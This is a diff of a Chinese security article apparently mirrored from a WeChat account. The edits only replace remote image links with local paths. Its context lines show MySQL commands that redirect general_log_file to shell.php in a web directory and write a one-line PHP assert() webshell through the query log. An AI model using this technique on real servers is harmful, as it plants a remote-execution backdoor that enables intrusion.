@@ -88,7 +88,7 @@ MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局�
 `show variables like 'general_log';    查看日志是否开启``set global general_log=on;    开启日志功能``show variables like 'general_log_file';    查看日志文件保存位置``set global general_log_file='D:/phpStudy/WWW/shell.php';    设置日志文件保存位置``show variables like 'log_output';    查看日志输出类型 table或file``set global log_output='table';    设置输出类型为 table``set global log_output='file';    设置输出类型为file``SELECT'<?php assert($_POST["YB666"]);?>';    通过日志来写入一句话`
 ```
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/vvO7f1bFAvWaTHu1neiamFqZxqompv2pJNmfTgxBxqzxCTdyUxMbH7SeM2UYvkMickzicWFLocDibXT3ScgTUzqxtg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![图片](../../.resource/remote/ed05e9aa76f95e089a815f4aef857fb2fc4d9016f42c72fcf289c1d8e28fb5f3.png)
 
   
 
@@ -98,13 +98,13 @@ MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局�
 set global general_log=on; -- 开启日志功能
 ```
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/vvO7f1bFAvWaTHu1neiamFqZxqompv2pJ0DysAckFahjXrESFF4iaSE3D3RQscRutfp5icecpqCvg295g0tMbcuAA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![图片](../../.resource/remote/5afbd62d722197ae70b65ad6c68cc6b62645836f7e5bc592835df0991864c777.png)
 
 ```
 show variables like 'general_log_file'; 查看日志文件保存位置
 ```
 
-![图片](https://mmbiz.qpic.cn/mmbiz_png/vvO7f1bFAvWaTHu1neiamFqZxqompv2pJD7n9IHQfxzNW6aI9ibCNJnMe8KaADQ7f7Xib3jbZxfjiagprgArRzQv5w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![图片](../../.resource/remote/f4df59c83f847c7b95af4b252ec6892f889efa06798b0714a8bdefe3c35c55da.png)
 
 ```
 show variables like 'log_output'; 查看日志输出类型 table或file
@@ -558,7 +558,7 @@ PAYLOAD：
 
   
 
- ![](http://mmbiz.qpic.cn/mmbiz_png/PZCtvaaOQSkFHqXy3A71Ac8FfuPhPR0Hl2BvOBTWyEKcqPLgnuWuMTkic16s7FvoSVk6E4QOWnpxusdgQnKWBPg/0?wx_fmt=png) ** 极梦C ** 网络安全/Bypass/攻防演练/红蓝对抗/。 14篇原创内容   公众号
+ ![](../../.resource/remote/faf8182b1e4d1bf277b8cdac9a894c8ea15ef6aac88103a97fed4511037d268e.png) ** 极梦C ** 网络安全/Bypass/攻防演练/红蓝对抗/。 14篇原创内容   公众号
 
   
 
